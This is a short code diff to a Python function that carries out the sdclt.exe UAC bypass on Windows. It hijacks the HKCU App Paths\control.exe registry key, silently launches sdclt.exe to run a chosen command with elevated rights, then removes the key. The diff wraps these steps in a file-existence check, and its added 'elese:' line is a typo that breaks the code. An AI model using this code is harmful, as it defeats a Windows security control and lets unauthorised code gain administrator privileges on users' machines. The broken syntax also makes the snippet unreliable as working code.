@@ -17,20 +17,23 @@ def cmd_path():
 		return False
 
 def sdclt_control_bypass():
-	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
-		_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
-	except Exception as error:
-		sys.exit()
+	if (os.path.isfile(os.path.join("c:\windows\system32\sdclt.exe")) == True):
+		try:
+			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
+			_winreg.SetValueEx(key,None,0,_winreg.REG_SZ,cmd_path())
+		except Exception as error:
+			sys.exit()
 
-	try:
-		win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe",None,None,win32con.SW_HIDE)
-	except Exception as error:
-		sys.exit()
+		try:
+			win32api.ShellExecute(0,None,"c:\windows\system32\sdclt.exe",None,None,win32con.SW_HIDE)
+		except Exception as error:
+			sys.exit()
 
-	time.sleep(5)
-			
-	try:
-		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
-	except Exception as error:
-		return False
+		time.sleep(5)
+
+		try:
+			_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")
+		except Exception as error:
+			return False
+	elese:
+		sys.exit()
